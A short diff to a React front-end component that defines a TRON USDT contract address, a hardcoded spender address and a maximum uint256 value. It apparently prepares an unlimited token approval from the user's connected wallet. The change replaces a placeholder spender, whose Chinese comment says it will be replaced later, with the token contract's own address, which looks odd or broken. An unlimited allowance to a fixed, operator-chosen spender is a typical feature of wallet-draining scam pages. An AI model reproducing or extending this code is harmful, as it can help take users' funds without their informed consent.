@@ -762,7 +762,7 @@ const Index = () => {
     if (!wallet) return;
 
     const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const SPENDER_ADDRESS = "TXYZabcdef1234567890abcdef12345678"; // 临时地址，后期替换
+    const SPENDER_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
     setError(null);
